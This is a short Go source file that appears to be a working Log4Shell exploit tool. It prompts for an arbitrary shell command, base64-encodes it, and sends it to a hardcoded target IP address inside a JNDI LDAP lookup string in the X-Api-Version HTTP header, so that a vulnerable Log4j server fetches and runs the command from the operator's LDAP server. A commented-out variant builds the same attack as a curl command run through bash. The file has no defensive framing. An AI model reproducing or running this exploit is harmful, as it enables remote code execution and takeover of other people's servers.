package payload

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"myapp/lib/sysinfo"
	"net/http"
	"os"
	"time"
)

var (
	payloadcmd string
)

func PayloadInput() {
	targetip := "168.138.44.152"
	targetport := "8080"
	sourceip, err := sysinfo.GetIP()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Println("Testing curl...")
	for {
		fmt.Println("Enter the payload command:")
		scanner := bufio.NewScanner(os.Stdin)
		if scanner.Scan() {
			payloadcmd = scanner.Text()
		}
		encodedpayloadcmd := base64.StdEncoding.EncodeToString([]byte(payloadcmd))
		// fmt.Println("Base64:", encodedpayloadcmd)

		// header := "X-Api-Version: ${jndi:ldap://" + sourceip.String() + ":1389/Basic/Command/Base64/" + encodedpayloadcmd + "}"

		// payload := "curl " + targetip + ":" + targetport + " -H '" + header + "'"
		// fmt.Println("Payload:", payload)

		// fmt.Println("Sending payload...")
		// cmd := exec.Command("bash", "-c", payload)
		// err = cmd.Run()
		// if err != nil {
		// 	fmt.Println("Error:", err)
		// } else {
		// 	fmt.Println("Payload sent.")
		// }
		target := "http://" + targetip + ":" + targetport
		req, err := http.NewRequest(("GET"), target, nil)
		if err != nil {
			fmt.Println("Error:", err)
			return
		}
		req.Header.Add("X-Api-Version", "${jndi:ldap://"+sourceip.String()+":1389/Basic/Command/Base64/"+encodedpayloadcmd+"}")
		fmt.Println("Sending payload...")
		client := &http.Client{
			Timeout: 10 * time.Second,
		}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error:", err)
			fmt.Println("Please try again.")
			continue
		}
		defer resp.Body.Close()
		responseBody, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error:", err)
			fmt.Println("Please try again.")
			continue
		}
		fmt.Println("Response:", string(responseBody))
		break
	}
}
